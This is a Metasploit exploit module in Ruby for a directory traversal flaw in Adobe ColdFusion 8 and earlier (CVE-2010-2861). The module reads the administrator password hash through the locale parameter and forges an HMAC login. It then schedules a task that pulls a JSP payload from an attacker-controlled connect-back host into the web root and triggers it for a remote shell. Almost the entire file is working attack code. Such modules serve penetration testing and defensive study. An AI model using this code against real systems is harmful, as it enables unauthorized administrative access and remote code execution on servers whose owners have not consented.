# $Id: coldfusion_traversal.rb 11974 2011-03-16 01:38:16Z mc $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Adobe ColdFusion - Directory Traversal&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a directory traversal bug in Adobe ColdFusion.
                By reading the password.properties a user can login using the encrypted
                password itself. This should work on version 8 and below.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         => [ &#039;webDEViL&#039; ],
            &#039;Version&#039;        => &#039;$Revision: 11974 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2010-2861&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.procheckup.com/vulnerability_manager/vulnerabilities/pr10-07&#039; ],  
                    [ &#039;URL&#039;, &#039;http://www.adobe.com/support/security/bulletins/apsb10-18.html&#039; ],       
                ],
            &#039;Privileged&#039;    => true,
            &#039;Platform&#039;      => [&#039;linux&#039;,&#039;windows&#039;],
            &#039;Stance&#039;        => Msf::Exploit::Stance::Aggressive,
            &#039;Targets&#039;       =>
                [
                    [ &#039;Universal&#039;,
                        {
                            &#039;Arch&#039; => ARCH_JAVA,
                            &#039;Payload&#039; => &#039;java&#039;
                        }
                    ],
                ],
 
            &#039;DisclosureDate&#039; => &#039;Aug 25 2010&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;SHELL&#039;, [ true, "The system shell to use.", &#039;automatic&#039;]),
                OptString.new(&#039;URL&#039;,   [ true, &#039;Administrator Directory&#039;, &#039;/CFIDE/administrator/&#039; ]),
                OptString.new(&#039;CBIP&#039;,  [ true, &#039;Connect Back IP (even when not using reverse shell)&#039;, nil ]),
                OptString.new(&#039;TRAV&#039;,  [ false, &#039;Location of the password.properties file eg. ../../../../ColdFusion8/lib/password.properties%00en&#039;, nil ]), 
            ], self.class)
 
    end
     
    def exploit
     
        ip = datastore[&#039;RHOST&#039;]
        url = datastore[&#039;URL&#039;]+"enter.cfm"
        locale = "?locale="
        trav = datastore[&#039;TRAV&#039;] || "../../../../../../../../../../../../../../../../../../../../../../lib/password.properties%00en"
        datastore[&#039;JSP&#039;] = "wD-"+rand_text_alphanumeric(6)+".jsp"
        datastore[&#039;URIPATH&#039;] = rand_text_alphanumeric(6)
         
        print_status("Trying to acheive Directory Traversal...")
        while trav.match(/..\//im)
            res = send_request_raw({
                &#039;uri&#039;     => url+locale+trav,
                &#039;method&#039;  => &#039;GET&#039;,
                &#039;headers&#039; =>
                    {
                        &#039;Connection&#039; => "keep-alive",
                        &#039;Accept-Encoding&#039; => "zip,deflate",
                    },
                }, -1)
     
            if (res.nil?)
                print_error("no response for #{ip}:#{rport} #{url}")
            elsif (res.code == 200)
                #print_error("#{res.body}")#debug
                 
                if match = res.body.match(/([0-9A-F]{40})/im);
                    caphash = $1
                    print_status("URL: #{ip}#{url}?locale=#{trav}")
                    print_status("Admin Hash: " + caphash)
                    break
                else
                    #select(nil, nil, nil, 3)
                    trav=trav[3..-1]
                    print_status("Trav:"+trav)
                     
                end
                 
            else
                &#039;&#039;
            end
        end
         
        if caphash.nil?
            print_error("Could not determine location of password.properties file, Set TRAV option manually")
            print_error("OR ColdFusion is not vulnerable")
            return
        end
         
        keyz = Time.now.to_i.to_s+"123"
        print_status("Time: "+ keyz)
        loghash= OpenSSL::HMAC.digest(OpenSSL::Digest::Digest.new(&#039;sha1&#039;), keyz, caphash).unpack(&#039;H*&#039;)[0].upcase
        print_status("Login Hash: "+loghash)
         
        params =  &#039;cfadminPassword=&#039;+loghash
        params << &#039;&requestedURL=%2FCFIDE%2Fadministrator%2Fenter.cfm%3F&&#039;
        params << &#039;salt=&#039;+keyz
        params << &#039;&submit=Login&#039;
 
        res = send_request_cgi({
            &#039;method&#039;    => &#039;POST&#039;,
            &#039;uri&#039;       => url,
            &#039;data&#039;  => params
        })
 
        if (res)
            #print_status("Me want Cookie: "+ res.headers[&#039;Set-Cookie&#039;])
            if (res.headers[&#039;Set-Cookie&#039;].match(/([A-Za-z0-9]{20,200})/im);)
                session = $1
                print_status("Cookie: #{session}")
            else
                print_error("Error retrieving cookie!")
            end
        else
            print_error("No response received while logging in.")
        end
 
        print_status("Attempting to automatically detect the platform...")
        ##AUTO_DETECT START
        path = datastore[&#039;URL&#039;] + &#039;settings/mappings.cfm&#039;
        res = send_request_raw(
            {
                &#039;uri&#039;    => path,
                &#039;headers&#039; =>
                    {
                        &#039;Cookie&#039;     => "CFAUTHORIZATION_cfadmin=#{session}"
                    }
            }, 20)
 
        if (not res) or (res.code != 200)
            print_error("Failed: Error requesting #{path}")
            return nil
        end
 
        if (res.body.match(/.*td *>(.*CFIDE&nbps;)/im);)
            os = $1
            os.match(/<td [^>]*?>(.*)&nbsp/im);
            os1 =$1
            os1 = os1.gsub("\t", &#039;&#039;)
            os1 = os1.gsub("\r\n", &#039;&#039;)
 
            if (os1 =~ /:/i) #haha ;)
                print_status(&#039;OS: Windows&#039;)
                datastore[&#039;SHELL&#039;] = &#039;cmd.exe&#039;
                os1=os1+"\\"       
            else #(os1 =~ /\//i)
                print_status(&#039;OS: Linux&#039;)
                datastore[&#039;SHELL&#039;] = &#039;/bin/sh&#039;
                os1=os1+"/"
            end
            print_status("Web Directory:"+os1)
        end
 
        ##AUTO_DETECT END
 
        res = send_request_raw(
            {
                &#039;uri&#039;     => "/CFIDE/administrator/scheduler/scheduleedit.cfm?submit=Schedule+New+Task",
                &#039;method&#039;  => &#039;GET&#039;,
                &#039;headers&#039; =>
                    {
                        &#039;Cookie&#039;     => "CFAUTHORIZATION_cfadmin=#{session}",
                    }
            }, 25)
 
        if (res.body.match(/<input name="StartTimeOnce".*?value="(.*?)">/im);)
            start_time = $1
        end
 
        if (res.body.match(/<input name="Start_Date".*?value="(.*?)" id="Start_Date">/im);)       
            start_date = $1
        end
        #else FAIL!
        comb = start_date + start_time
        fmt = "%b %d, %Y%I:%M %p"
 
        comb = ((DateTime.strptime(comb,fmt)).advance :minutes =>-19)
        t = comb.strftime("%b %d, %Y")
        t1 = comb.strftime("%I:%M %p")
        #t=(Time.now).strftime("%b %d, %Y") #can&#039;t use local time
        #t1=(Time.now + 5).strftime("%I:%M:%S %p")
        params =  &#039;TaskName=wD-&#039;+rand_text_alphanumeric(6)
        params << "&Start_Date=#{t}" #Mar+12%2C+2011
        params << &#039;&End_Date=&ScheduleType=Once&#039;
        params << "&StartTimeOnce=#{t1}" #6%3A40+PM
        params << &#039; &Interval=Daily&StartTimeDWM=&customInterval_hour=0&customInterval_min=0&customInterval_sec=0&CustomStartTime=&CustomEndTime=&Operation=HTTPRequest&#039;
        params << &#039;&ScheduledURL=http%3A%2F%2F&#039;+datastore[&#039;CBIP&#039;]+":"+datastore[&#039;SRVPORT&#039;]+"/"+datastore[&#039;URIPATH&#039;]
        params << &#039;&Username=&Password=&Request_Time_out=&proxy_server=&http_proxy_port=&publish=1&#039;
        params << &#039;&publish_file=&#039;+os1+datastore[&#039;JSP&#039;]
        params << &#039;&adminsubmit=Submit&taskNameOrig=&#039;
         
        res = send_request_raw(
            {
                &#039;uri&#039;     => "/CFIDE/administrator/scheduler/scheduleedit.cfm",
                &#039;method&#039;  => &#039;POST&#039;,
                &#039;data&#039;    => params,
                &#039;headers&#039; =>
                    {
                        &#039;Content-Type&#039;   => &#039;application/x-www-form-urlencoded&#039;,
                        &#039;Content-Length&#039; => params.length,
                        &#039;Cookie&#039;     => "CFAUTHORIZATION_cfadmin=#{session}",
                    }
            }, 25)
        #print_error("#{res.body}")
        super
    end
         
    def on_request_uri(cli, request)
        p = regenerate_payload(cli)
        #print_status("SHELL set to #{datastore[&#039;SHELL&#039;]}")
        #print_status((p.encoded).to_s)
         
        print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")
 
        # Transmit the response to the client
        send_response(cli, p.encoded, { &#039;Content-Type&#039; => &#039;text/html&#039; })
 
        res = send_request_raw(
            {
                &#039;uri&#039;     => "/CFIDE/"+datastore[&#039;JSP&#039;],
                &#039;method&#039;  => &#039;GET&#039;,
            }, 25)
        # Handle the payload
        handler(cli)
    end
end



